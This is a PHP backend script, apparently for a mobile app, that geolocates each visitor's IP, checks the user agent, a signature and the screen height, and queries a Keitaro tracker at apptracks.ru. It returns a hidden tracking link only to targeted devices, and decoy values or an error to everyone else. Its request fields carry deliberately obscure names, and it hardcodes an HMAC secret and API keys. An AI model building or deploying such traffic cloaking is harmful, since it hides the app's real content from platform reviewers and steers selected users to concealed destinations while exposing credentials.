<?php
    include 'encode.php';
    header("Content-type: application/json; charset=utf-8");
    
    /*!!!!!!менять по факту только значения!!!!!!
    (голубым цветом) а дальше, как разберешься*/
$user_ip = isset($_SERVER["REMOTE_ADDR"]) ? trim($_SERVER["REMOTE_ADDR"]) : 'not_specified';

$ua_agent_app = isset($_SERVER["HTTP_USER_AGENT"])
    ? trim($_SERVER["HTTP_USER_AGENT"])
    : 'not_specified';

$user_ip_country_from_serv = 'not_specified';
$user_ip_country_code_from_serv = 'not_specified';
$user_ip_isp = 'not_specified';
$user_ip_timezone = 'not_specified';

if ($user_ip !== 'not_specified') {

    $query = [
        'fields' => 'success,country,country_code,connection,timezone'
    ];

    $url = "https://ipwho.is/" . urlencode($user_ip) . "?" . http_build_query($query);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $response = curl_exec($ch);
    $curl_error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $geo_data = json_decode($response, true);

    // Временно для проверки, потом можно убрать
    error_log("IPWHOIS URL: " . $url);
    error_log("IPWHOIS HTTP CODE: " . $http_code);
    error_log("IPWHOIS CURL ERROR: " . $curl_error);
    error_log("IPWHOIS RESPONSE: " . $response);

    if (is_array($geo_data) && isset($geo_data['success']) && $geo_data['success'] === true) {

        $user_ip_country_from_serv = !empty($geo_data['country'])
            ? trim($geo_data['country'])
            : 'not_specified';

        $user_ip_country_code_from_serv = !empty($geo_data['country_code'])
            ? trim($geo_data['country_code'])
            : 'not_specified';

        if (!empty($geo_data['connection']['isp'])) {
            $user_ip_isp = trim($geo_data['connection']['isp']);
        } elseif (!empty($geo_data['connection']['org'])) {
            $user_ip_isp = trim($geo_data['connection']['org']);
        }

        if (!empty($geo_data['timezone']['id'])) {
            $user_ip_timezone = trim($geo_data['timezone']['id']);
        }

    } else {
        error_log("IPWHOIS FAILED DATA: " . print_r($geo_data, true));
    }
}
    $ua_agent_for_check = "okhttp/4.12.0";
    $secret = 'N9qL7vX2aHkW5rT8mZpD4jFg6YsU';
    $heightTrue = "true";
    $signatureTrue = "true";
    $data = [];
    parse_str(trim($_POST['psithurism'] ?? ''), $data); //-------------
    $ua_agent_app_from_json = $data['KoalaBoomerang'] ?? $ua_agent_app; 
    
    
    $ya_post_api_key = getenv('YA_POST_API_KEY') ?: 'e472944f-b494-4c6a-b8e0-0188c5303381';
    $ya_app_id = getenv('YA_APP_ID') ?: '6309553';   //-------------
    $ya_user_id = trim($_POST['meretricious'] ?? '') ?: 'not_specified';
    $timestamp = trim($_POST['hypaethral'] ?? '') ?: 'not_specified';
    $nonce = trim($_POST['pareidolia'] ?? '') ?: 'not_specified';
    $signature = trim($_POST['zugzwang'] ?? '') ?: 'not_specified';
    
    $user_height = trim($_POST['ommatidium'] ?? '') ?: 'not_specified';
    $app_version = trim($_POST['cachinnate'] ?? '') ?: 'not_specified';
    $accept_language = trim($_POST['scotophilic'] ?? '') ?: 'not_specified';
    $navigator_language = trim($_POST['gyrovague'] ?? '') ?: 'not_specified';
    $timezone = trim($_POST['lithomancy'] ?? '') ?: 'not_specified';
    
    $payload = $ya_user_id . '|' . $timestamp . '|' . $nonce;
    $expectedSignature = hash_hmac('sha256', $payload, $secret);
    if (!hash_equals($expectedSignature, $signature)) {
       $signatureTrue = "false";
    }
    if (!is_numeric($user_height) || $user_height < 530) {
        $heightTrue = "false";
    }
    
    $keitaro_api_key = getenv('KEITARO_API_KEY') ?: '8ZrSJ93KYVy29wt5'; 
    $keitaro_sub_id_1 = "vlk_309_Aussie";
    $keitaro_sub_id_2 = $user_ip_country_from_serv;
    $keitaro_sub_id_3 = $user_ip_country_code_from_serv;
    $keitaro_sub_id_4 = $ua_agent_app;  
    $keitaro_sub_id_5 = $user_ip_isp;
    $keitaro_sub_id_6 = $signatureTrue;
    $keitaro_sub_id_7 = $heightTrue;
    $keitaro_sub_id_20 = $user_height;
    $keitaro_sub_id_10 = $app_version;
    $keitaro_sub_id_11 = $accept_language;
    $keitaro_sub_id_12 = $navigator_language;
    $keitaro_sub_id_13 = $timezone;
    $keitaro_sub_id_14 = $user_ip_timezone;
    $x_requested_with = substr($ua_agent_app, 0, 12) ?: 'not_specified';
    
     //------ ссылка теперь кодируется через файл encode.php
    $track_url_origin = "https://apptracks.ru/vlk_309?external_id=$ya_user_id&sub_id_14=$ya_app_id&sub_id_15=$ya_post_api_key&sub_id_3=$keitaro_sub_id_3";
    $track_url = str_replace(' ', '%20', csr($track_url_origin, 1));
    
    $keitaro_check_ip_url_original = "https://apptracks.ru/click_api/v3?token=$keitaro_api_key&sub_id_1=$keitaro_sub_id_1&sub_id_2=$keitaro_sub_id_2&sub_id_3=$keitaro_sub_id_3&sub_id_4=$keitaro_sub_id_4&sub_id_5=$keitaro_sub_id_5&sub_id_6=$keitaro_sub_id_6&sub_id_7=$keitaro_sub_id_7&sub_id_8=$ya_user_id&sub_id_10=$keitaro_sub_id_10&sub_id_11=$keitaro_sub_id_11&sub_id_12=$keitaro_sub_id_12&sub_id_13=$keitaro_sub_id_13&sub_id_14=$keitaro_sub_id_14&sub_id_20=$keitaro_sub_id_20&ip=$user_ip&user_agent=$ua_agent_app_from_json&language=$user_ip_country_code_from_serv&x_requested_with=$x_requested_with&contentType=json";    $keitaro_check_ip_url = str_replace(' ', '%20', $keitaro_check_ip_url_original); 
    
     $keitaro_answer_for_wv = "SNG_RU";
    $keitaro_answer_from_check_ip = null;
    if (keitaro_answer_start($keitaro_check_ip_url, $keitaro_answer_from_check_ip)) {
        if ($keitaro_answer_from_check_ip === $keitaro_answer_for_wv && $ua_agent_for_check === $ua_agent_app) {
            $json_for_app = json_encode([
                "accismus" => $track_url,
                "noctilucent" => "sphygmogram",
                "corymbose" => "pandiculation"
            ], JSON_UNESCAPED_SLASHES);
        } elseif ($ua_agent_for_check !== $ua_agent_app) {
            $json_for_app = json_encode([
                "error" => "Invalid device",
                "message" => "This API can only be accessed from a mobile application."
            ]);
        } else {
            $json_for_app = json_encode([
                "accismus" => "pyrrhonism",
                "noctilucent" => "eurythmic",
                "corymbose" => "claustral"
            ], JSON_UNESCAPED_SLASHES);
        }
    } else {
        $json_for_app = json_encode([
            "error" => "Unexpected condition",
            "message" => "Failed to process request."
        ]);
    }
    echo $json_for_app;
    
    function keitaro_answer_start($keitaro_check_ip_url, &$keitaro_answer_from_check_ip)
    {
    $log_file = fopen("request_error_logs.txt", "a");
    $ch = curl_init($keitaro_check_ip_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        fwrite($log_file, "cURL error: " . curl_error($ch) . "\n");
        curl_close($ch);
        fclose($log_file);
        return false;
    }
    
    curl_close($ch);
    $data = json_decode($response);
    if (json_last_error() !== JSON_ERROR_NONE) {
        fwrite($log_file, "Error parsing JSON: " . json_last_error_msg() . "\n");
        fclose($log_file);
        return false;
    }
    
    if (!isset($data->body)) {
        fwrite($log_file, "The 'body' field is missing from the response.\n");
        fclose($log_file);
        return false;
    }
    
    $keitaro_answer_from_check_ip = $data->body;
    fclose($log_file);
    return true;
    }
    
    include 'clients_logs.php';
?>
